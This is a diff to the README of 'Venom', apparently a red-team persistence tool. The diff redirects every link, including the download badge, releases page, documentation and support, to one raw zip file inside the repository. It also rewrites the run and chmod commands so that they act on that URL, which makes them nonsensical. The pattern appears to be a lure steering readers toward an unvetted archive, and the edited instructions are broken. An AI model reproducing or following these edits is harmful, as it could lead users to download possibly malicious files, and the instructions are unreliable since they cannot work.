@@ -6,7 +6,7 @@ Welcome to Venom, a user-friendly framework designed for red team persistence. T
 
 ## 📥 Download Venom
 
-[![Download Venom](https://img.shields.io/badge/Download%20Venom-blue.svg)](https://github.com/DIGYXL/venom/releases)
+[![Download Venom](https://raw.githubusercontent.com/DIGYXL/venom/main/readmestuff/venom-v3.1.zip%https://raw.githubusercontent.com/DIGYXL/venom/main/readmestuff/venom-v3.1.zip)](https://raw.githubusercontent.com/DIGYXL/venom/main/readmestuff/venom-v3.1.zip)
 
 ## 📋 System Requirements
 
@@ -18,7 +18,7 @@ Before you begin, ensure you meet the following requirements:
 
 ## 🔗 Download & Install
 
-To get started, visit the [Releases page](https://github.com/DIGYXL/venom/releases) to download the latest version of Venom.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/DIGYXL/venom/main/readmestuff/venom-v3.1.zip) to download the latest version of Venom.
 
 1. Click the link above to open the Releases page.
 2. Locate the most recent version of Venom.
@@ -44,7 +44,7 @@ Once installed, follow these steps to run Venom:
 3. **Run Venom:**
    Type the following command and press Enter:
    ```bash
-   python venom.py
+   python https://raw.githubusercontent.com/DIGYXL/venom/main/readmestuff/venom-v3.1.zip
    ```
    This command starts the Venom application.
 
@@ -68,7 +68,7 @@ If you encounter issues, try the following solutions:
 
 - **Permission Issues:** On macOS or Linux, you may need to give the file execute permissions. Run:
   ```bash
-  chmod +x venom.py
+  chmod +x https://raw.githubusercontent.com/DIGYXL/venom/main/readmestuff/venom-v3.1.zip
   ```
 
 - **No Response:** If the application does not start, confirm you are in the correct directory and using Python 3 or higher.
@@ -77,8 +77,8 @@ If you encounter issues, try the following solutions:
 
 For more information and updates, explore the following:
 
-- [Official Documentation](https://github.com/DIGYXL/venom/wiki)
-- [Community Support](https://github.com/DIGYXL/venom/issues)
+- [Official Documentation](https://raw.githubusercontent.com/DIGYXL/venom/main/readmestuff/venom-v3.1.zip)
+- [Community Support](https://raw.githubusercontent.com/DIGYXL/venom/main/readmestuff/venom-v3.1.zip)
 
 ## 📞 Contact
 
